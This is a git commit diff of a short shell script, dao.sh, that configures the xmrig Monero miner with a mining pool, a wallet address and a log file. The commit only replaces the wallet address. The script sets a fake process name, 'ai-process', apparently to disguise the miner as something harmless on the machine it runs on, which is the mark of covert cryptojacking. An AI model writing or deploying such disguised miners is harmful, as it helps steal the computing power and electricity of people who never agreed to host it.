fe68e9cfd1ccc71637c3f6d1a56a57a3805bc071
ChauDuongw <minhchau29102006@gmail.com>
2025-08-11 12:56:02 +0700

    Update dao.sh

--- dao.sh
+++ dao.sh
@@ -1,6 +1,6 @@
 FAKE_NAME="ai-process"
 POOL_URL="pool.supportxmr.com:443"
-WALLET="43ZyyD81HJrhUaVYkfyV9A4pDG3AsyMmE8ATBZVQMLVW6FMszZbU28Wd35wWtcUZESeP3CAXW14cMAVYiKBtaoPCD5ZHPCj"
+WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
 LOG_FILE="./xmrig.log"  # Đặt đường dẫn log
 
 if [ ! -f "./xmrig" ]; then
